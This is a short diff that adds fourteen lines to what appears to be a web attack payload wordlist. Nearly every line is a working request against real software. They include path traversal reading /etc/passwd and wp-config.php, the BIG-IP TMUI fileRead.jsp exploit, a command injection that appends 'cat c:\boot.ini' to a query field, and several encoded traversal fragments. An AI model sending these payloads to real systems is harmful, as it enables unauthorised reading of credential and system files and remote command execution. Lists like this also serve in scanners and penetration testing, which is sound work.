@@ -1,0 +1,14 @@
+/images/..%2fcgi/cgi_i_filter.js?_tn={{trimprefix(base64_decode(httoken)
+/wp-admin/admin-ajax.php?action=duplicator_download&file=%2F..%2Fwp-config.php
+/manager/network_query.php?portNum=80&queryType=all&target=q5u4a3l2y1s.com%3Bcat+c:\boot.ini&Submit=Do+It
+/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
+/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license
+/index.php/Home/uploadify/fileList?path=../../../&type=.+
+/opm/read_sessionlog.php?logFile=....//....//....//....//etc/passwd
+/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development
+/wp-admin/admin-ajax.php?action=duplicator_download&file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+..%255c
+.%5c../..%5c
+/..%c0%9v../
+/..%c0%af../
+/..%255c..%255c
